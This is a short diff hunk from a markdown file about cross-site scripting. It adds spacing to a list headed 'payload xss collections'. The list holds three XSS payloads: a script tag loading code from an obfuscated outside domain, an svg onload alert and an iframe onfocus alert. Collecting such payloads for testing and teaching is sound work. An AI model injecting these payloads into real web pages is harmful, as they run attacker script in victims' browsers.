@@ -5,5 +5,7 @@ Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious s
 **Some amazing payload xss collections**
 
 <script/src=//⑭.₨>
+
 <svg/onload=alert()>
+
 <iframe autofocus onfocus=alert(1)>
